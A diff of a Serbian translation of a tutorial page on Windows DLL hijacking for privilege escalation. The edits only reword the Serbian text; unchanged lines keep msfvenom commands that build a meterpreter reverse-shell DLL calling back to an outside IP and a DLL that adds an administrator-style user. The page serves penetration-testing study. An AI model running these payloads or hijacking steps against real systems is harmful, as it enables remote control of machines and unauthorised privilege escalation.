@@ -23,18 +23,18 @@ Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-s
 
 ## Basic Information
 
-DLL Hijacking uključuje manipulaciju pouzdane aplikacije da učita zlonamerni DLL. Ovaj termin obuhvata nekoliko taktika kao što su **DLL Spoofing, Injection, i Side-Loading**. Uglavnom se koristi za izvršavanje koda, postizanje postojanosti, i, ređe, eskalaciju privilegija. Iako je fokus ovde na eskalaciji, metoda otmice ostaje dosledna kroz ciljeve.
+DLL Hijacking uključuje manipulaciju poverljivom aplikacijom da učita zloćudni DLL. Ovaj termin obuhvata nekoliko taktika kao što su **DLL Spoofing, Injection, i Side-Loading**. Uglavnom se koristi za izvršavanje koda, postizanje postojanosti i, ređe, eskalaciju privilegija. Iako je fokus ovde na eskalaciji, metoda otmice ostaje dosledna kroz ciljeve.
 
 ### Common Techniques
 
 Nekoliko metoda se koristi za DLL hijacking, svaka sa svojom efikasnošću u zavisnosti od strategije učitavanja DLL-a aplikacije:
 
-1. **DLL Replacement**: Zamena pravog DLL-a sa zlonamernim, opcionalno koristeći DLL Proxying da očuva funkcionalnost originalnog DLL-a.
-2. **DLL Search Order Hijacking**: Postavljanje zlonamernog DLL-a u pretraznu putanju ispred legitimnog, iskorišćavajući obrazac pretrage aplikacije.
-3. **Phantom DLL Hijacking**: Kreiranje zlonamernog DLL-a koji aplikacija učitava, misleći da je to nepostojeći potrebni DLL.
-4. **DLL Redirection**: Modifikovanje pretraživačkih parametara kao što su `%PATH%` ili `.exe.manifest` / `.exe.local` datoteke da usmere aplikaciju na zlonamerni DLL.
-5. **WinSxS DLL Replacement**: Zamena legitimnog DLL-a sa zlonamernim u WinSxS direktorijumu, metoda koja se često povezuje sa DLL side-loading.
-6. **Relative Path DLL Hijacking**: Postavljanje zlonamernog DLL-a u direktorijum pod kontrolom korisnika sa kopiranom aplikacijom, podsećajući na tehnike Binary Proxy Execution.
+1. **DLL Replacement**: Zamena pravog DLL-a sa zloćudnim, opcionalno koristeći DLL Proxying da očuva funkcionalnost originalnog DLL-a.
+2. **DLL Search Order Hijacking**: Postavljanje zloćudnog DLL-a u putanju pre legitimnog, iskorišćavajući obrazac pretrage aplikacije.
+3. **Phantom DLL Hijacking**: Kreiranje zloćudnog DLL-a koji aplikacija učitava, misleći da je nepostojeći potrebni DLL.
+4. **DLL Redirection**: Modifikovanje pretraživačkih parametara kao što su `%PATH%` ili `.exe.manifest` / `.exe.local` datoteke da usmere aplikaciju na zloćudni DLL.
+5. **WinSxS DLL Replacement**: Zamena legitimnog DLL-a sa zloćudnim u WinSxS direktorijumu, metoda koja se često povezuje sa DLL side-loading.
+6. **Relative Path DLL Hijacking**: Postavljanje zloćudnog DLL-a u direktorijum pod kontrolom korisnika sa kopiranom aplikacijom, podsećajući na tehnike Binary Proxy Execution.
 
 ## Finding missing Dlls
 
@@ -49,7 +49,7 @@ i samo prikazivanje **Aktivnosti fajl sistema**:
 ![](<../../../.gitbook/assets/image (153).png>)
 
 Ako tražite **nedostajuće dll-ove uopšte**, možete **ostaviti** ovo da radi nekoliko **sekundi**.\
-Ako tražite **nedostajući dll unutar specifične izvršne datoteke**, trebali biste postaviti **drugi filter kao "Process Name" "contains" "\<exec name>", izvršiti ga, i zaustaviti hvatanje događaja**.
+Ako tražite **nedostajući dll unutar specifične izvršne datoteke**, trebali biste postaviti **drugi filter kao "Process Name" "contains" "\<exec name>", izvršiti ga, i prestati sa snimanjem događaja**.
 
 ## Exploiting Missing Dlls
 
@@ -59,7 +59,7 @@ Da bismo eskalirali privilegije, najbolja šansa koju imamo je da možemo **napi
 
 **Unutar** [**Microsoft dokumentacije**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **možete pronaći kako se DLL-ovi učitavaju specifično.**
 
-**Windows aplikacije** traže DLL-ove prateći set **predefinisanih pretražnih putanja**, pridržavajući se određenog reda. Problem DLL hijacking-a nastaje kada se štetan DLL strateški postavi u jedan od ovih direktorijuma, osiguravajući da se učita pre autentičnog DLL-a. Rešenje za sprečavanje ovoga je osigurati da aplikacija koristi apsolutne putanje kada se poziva na DLL-ove koje zahteva.
+**Windows aplikacije** traže DLL-ove prateći skup **predefinisanih putanja za pretragu**, pridržavajući se određenog reda. Problem DLL hijacking-a nastaje kada se štetan DLL strateški postavi u jedan od ovih direktorijuma, osiguravajući da se učita pre autentičnog DLL-a. Rešenje za sprečavanje ovoga je osigurati da aplikacija koristi apsolutne putanje kada se poziva na DLL-ove koje zahteva.
 
 Možete videti **redosled pretrage DLL-a na 32-bitnim** sistemima u nastavku:
 
@@ -69,19 +69,19 @@ Možete videti **redosled pretrage DLL-a na 32-bitnim** sistemima u nastavku:
 4. Windows direktorijum. Koristite [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) funkciju da dobijete putanju ovog direktorijuma.
 1. (_C:\Windows_)
 5. Trenutni direktorijum.
-6. Direktorijumi koji su navedeni u PATH promenljivoj okruženja. Imajte na umu da ovo ne uključuje putanju po aplikaciji koju određuje **App Paths** registry ključ. **App Paths** ključ se ne koristi prilikom izračunavanja DLL pretraživačke putanje.
+6. Direktorijumi koji su navedeni u PATH promenljivoj okruženja. Imajte na umu da ovo ne uključuje putanju po aplikaciji koju određuje **App Paths** registry ključ. **App Paths** ključ se ne koristi prilikom izračunavanja DLL putanje pretrage.
 
 To je **podrazumevani** redosled pretrage sa **SafeDllSearchMode** omogućenim. Kada je on onemogućen, trenutni direktorijum se penje na drugo mesto. Da biste onemogućili ovu funkciju, kreirajte **HKEY\_LOCAL\_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** registry vrednost i postavite je na 0 (podrazumevano je omogućeno).
 
-Ako se pozove [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) funkcija sa **LOAD\_WITH\_ALTERED\_SEARCH\_PATH**, pretraga počinje u direktorijumu izvršnog modula koji **LoadLibraryEx** učitava.
+Ako se poziva [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) funkcija sa **LOAD\_WITH\_ALTERED\_SEARCH\_PATH**, pretraga počinje u direktorijumu izvršnog modula koji **LoadLibraryEx** učitava.
 
-Na kraju, imajte na umu da **dll može biti učitan ukazujući apsolutnu putanju umesto samo imena**. U tom slučaju, taj dll će se **samo pretraživati u toj putanji** (ako dll ima bilo kakve zavisnosti, one će se pretraživati kao da su samo učitane po imenu).
+Na kraju, imajte na umu da **dll može biti učitan ukazujući na apsolutnu putanju umesto samo na ime**. U tom slučaju, taj dll će se **samo pretraživati u toj putanji** (ako dll ima bilo kakve zavisnosti, one će se pretraživati kao da su samo učitane po imenu).
 
 Postoje i drugi načini za promenu načina pretrage, ali ih ovde neću objašnjavati.
 
 #### Exceptions on dll search order from Windows docs
 
-Određene izuzetke od standardnog DLL pretraživačkog reda beleže Windows dokumentacija:
+Određene izuzetke od standardnog DLL redosleda pretrage beleže Windows dokumentacija:
 
 * Kada se naiđe na **DLL koji deli svoje ime sa jednim već učitanim u memoriji**, sistem zaobilazi uobičajenu pretragu. Umesto toga, vrši proveru preusmeravanja i manifest pre nego što se vrati na DLL već u memoriji. **U ovom scenariju, sistem ne sprovodi pretragu za DLL**.
 * U slučajevima kada je DLL prepoznat kao **poznati DLL** za trenutnu verziju Windows-a, sistem će koristiti svoju verziju poznatog DLL-a, zajedno sa bilo kojim od njegovih zavisnih DLL-ova, **preskočivši proces pretrage**. Registry ključ **HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** sadrži listu ovih poznatih DLL-ova.
@@ -95,7 +95,7 @@ Određene izuzetke od standardnog DLL pretraživačkog reda beleže Windows doku
 * Osigurajte da je **pristup za pisanje** dostupan za bilo koji **direktorijum** u kojem će se **DLL** **pretraživati**. Ova lokacija može biti direktorijum izvršne datoteke ili direktorijum unutar sistemske putanje.
 
 Da, zahtevi su komplikovani za pronalaženje jer je **po defaultu čudno pronaći privilegovanu izvršnu datoteku bez dll-a** i još je **čudnije imati dozvole za pisanje u folderu sistemske putanje** (po defaultu ne možete). Ali, u pogrešno konfiguriranim okruženjima ovo je moguće.\
-U slučaju da imate sreće i ispunjavate zahteve, možete proveriti projekat [UACME](https://github.com/hfiref0x/UACME). Čak i ako je **glavni cilj projekta zaobilaženje UAC**, možda ćete tamo pronaći **PoC** za Dll hijacking za verziju Windows-a koju možete koristiti (verovatno samo menjajući putanju foldera gde imate dozvole za pisanje).
+U slučaju da imate sreće i ispunjavate zahteve, možete proveriti [UACME](https://github.com/hfiref0x/UACME) projekat. Čak i ako je **glavni cilj projekta zaobilaženje UAC**, možda ćete tamo pronaći **PoC** za Dll hijacking za verziju Windows-a koju možete koristiti (verovatno samo menjajući putanju foldera gde imate dozvole za pisanje).
 
 Imajte na umu da možete **proveriti svoje dozvole u folderu** tako što ćete:
 ```bash
@@ -124,8 +124,8 @@ Ostali zanimljivi automatizovani alati za otkrivanje ove ranjivosti su **PowerSp
 
 ### Primer
 
-U slučaju da pronađete scenario koji se može iskoristiti, jedna od najvažnijih stvari za uspešno iskorišćavanje bi bila da **napravite dll koji izvozi barem sve funkcije koje će izvršni program uvesti iz njega**. U svakom slučaju, imajte na umu da Dll Hijacking dolazi u obzir kako bi se [eskaliralo sa Medium Integrity nivoa na High **(zaobilaženje UAC)**](../../authentication-credentials-uac-and-efs/#uac) ili sa [**High Integrity na SYSTEM**](../#from-high-integrity-to-system)**.** Možete pronaći primer **kako napraviti validan dll** unutar ove studije o dll hijackingu fokusirane na dll hijacking za izvršenje: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
-Pored toga, u **sledećem odeljku** možete pronaći neke **osnovne dll kodove** koji bi mogli biti korisni kao **šabloni** ili za kreiranje **dll sa neobaveznim izvezenim funkcijama**.
+U slučaju da pronađete scenario koji se može iskoristiti, jedna od najvažnijih stvari za uspešno iskorišćavanje bi bila da **napravite dll koji izvozi barem sve funkcije koje će izvršni program uvesti iz njega**. U svakom slučaju, imajte na umu da Dll Hijacking dolazi u obzir kako bi se [eskaliralo sa Medium Integrity nivoa na High **(zaobilaženje UAC)**](../../authentication-credentials-uac-and-efs/#uac) ili sa [**High Integrity na SYSTEM**](../#from-high-integrity-to-system)**.** Možete pronaći primer **kako napraviti validan dll** unutar ove studije o dll hijacking-u fokusirane na dll hijacking za izvršenje: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
+Pored toga, u **sledećem odeljku** možete pronaći neke **osnovne dll kodove** koji bi mogli biti korisni kao **šabloni** ili za kreiranje **dll-a sa neobaveznim izvezenim funkcijama**.
 
 ## **Kreiranje i kompajliranje Dll-ova**
 
@@ -133,7 +133,7 @@ Pored toga, u **sledećem odeljku** možete pronaći neke **osnovne dll kodove**
 
 U suštini, **Dll proxy** je Dll sposoban da **izvrši vaš zlonamerni kod kada se učita**, ali takođe da **izloži** i **radi** kao **očekivano** tako što **preusmerava sve pozive na pravu biblioteku**.
 
-Sa alatom [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) ili [**Spartacus**](https://github.com/Accenture/Spartacus) možete zapravo **naznačiti izvršni program i odabrati biblioteku** koju želite da proxifujete i **generisati proxifovani dll** ili **naznačiti Dll** i **generisati proxifovani dll**.
+Sa alatom [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) ili [**Spartacus**](https://github.com/Accenture/Spartacus) možete zapravo **naznačiti izvršni program i odabrati biblioteku** koju želite da proxifikuje i **generisati proxified dll** ili **naznačiti Dll** i **generisati proxified dll**.
 
 ### **Meterpreter**
 
@@ -149,7 +149,7 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dl
 ```
 msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
 ```
-### Vaš
+### Vaš vlastiti
 
 Napomena da u nekoliko slučajeva Dll koji kompajlirate mora **izvoziti nekoliko funkcija** koje će biti učitane od strane procesa žrtve, ako ove funkcije ne postoje **binarni fajl neće moći da ih učita** i **eksploit će propasti**.
 ```c
@@ -239,7 +239,7 @@ return TRUE;
 
 <figure><img src="../../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>
 
-**Bug bounty savjet**: **prijavite se** za **Intigriti**, premium **bug bounty platformu koju su kreirali hakeri, za hakere**! Pridružite nam se na [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) danas, i počnite da zarađujete nagrade do **$100,000**!
+**Bug bounty tip**: **prijavite se** za **Intigriti**, premium **bug bounty platformu koju su kreirali hakeri, za hakere**! Pridružite nam se na [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) danas, i počnite da zarađujete nagrade do **$100,000**!
 
 {% embed url="https://go.intigriti.com/hacktricks" %}
 
